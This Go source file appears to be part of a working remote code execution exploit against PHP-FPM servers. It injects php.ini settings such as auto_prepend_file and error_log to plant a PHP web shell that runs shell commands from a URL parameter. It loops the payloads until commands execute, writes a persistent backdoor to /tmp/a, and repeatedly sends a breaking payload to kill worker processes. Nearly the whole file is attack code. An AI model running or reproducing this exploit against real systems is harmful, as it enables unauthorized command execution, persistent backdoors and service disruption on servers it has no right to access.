package main

import (
	"bytes"
	"log"
	"net/url"
)

var chain = []string{
	"short_open_tag=1",
	"html_errors=0",
	"include_path=/tmp",
	"auto_prepend_file=a",
	"log_errors=1",
	"error_reporting=2",
	"error_log=/tmp/a",
	"extension_dir=\"<?=`\"",
	"extension=\"$_GET[a]`?>\"",
}

const (
	checkCommand   = `a=/bin/sh+-c+'which+which'&` // must not contain any chars that are encoded (except space)
	successPattern = "/bin/which"
	cleanupCommand = ";echo '<?php echo `$_GET[a]`;return;?>'>/tmp/a;which which"
)

func Attack(requester *Requester, params *AttackParams) error {
	log.Printf("Performing attack using php.ini settings...")

attackLoop:
	for {
		for _, payload := range chain {
			_, body, err := SetSettingSingle(requester, params, payload, checkCommand)
			if err != nil {
				return err
			}
			if bytes.Contains(body, []byte(successPattern)) {
				log.Printf(`Success! Was able to execute a command by appending "?%s" to URLs`, checkCommand)
				break attackLoop
			}
		}

	}

	log.Printf("Trying to cleanup /tmp/a...")
	cleanup := url.Values{"a": []string{cleanupCommand}}
	for {
		_, body, err := requester.RequestWithQueryStringPrefix("/", params, cleanup.Encode()+"&")
		if err != nil {
			return err
		}
		if bytes.Contains(body, []byte(successPattern)) {
			log.Print("Done!")
			break
		}
	}
	return nil
}

func KillWorkers(requester *Requester, params *AttackParams, killCount int) error {
	for i := 0; i < killCount; i++ {
		if _, _, err := requester.Request(BreakingPayload, params); err != nil {
			return err
		}
	}
	return nil
}
